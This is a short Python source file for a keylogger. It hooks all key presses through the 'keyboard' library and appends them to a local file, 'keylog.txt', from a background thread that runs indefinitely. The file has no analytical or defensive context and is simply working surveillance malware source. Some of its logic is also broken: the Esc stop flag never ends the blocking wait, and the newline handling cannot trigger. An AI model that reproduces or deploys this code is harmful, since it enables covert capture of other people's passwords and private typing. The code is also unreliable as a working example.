import sys
import time
from threading import Thread
import keyboard

class Keylogger:
    def __init__(self, log_file):
        self.log_file = log_file
        self.running = False

    def callback(self, event):
        if event.name == 'esc':
            self.stop()
        else:
            with open(self.log_file, 'a') as f:
                key = event.name.replace(' ', '[SPACE]').replace('\n', '[ENTER]')
                if len(key) > 1:
                    f.write(f'[{key}]')
                else:
                    f.write(key)

    def start(self):
        self.running = True
        while self.running:
            try:
                keyboard.on_press(self.callback)
                keyboard.wait()
            except Exception as e:
                sys.exit(str(e))

    def stop(self):
        self.running = False

def main():
    log_file = 'keylog.txt'
    keylogger = Keylogger(log_file)
    t = Thread(target=keylogger.start, daemon=True)
    t.start()
    while True:
        time.sleep(1000)  # Keep the main thread alive

if __name__ == '__main__':
    main()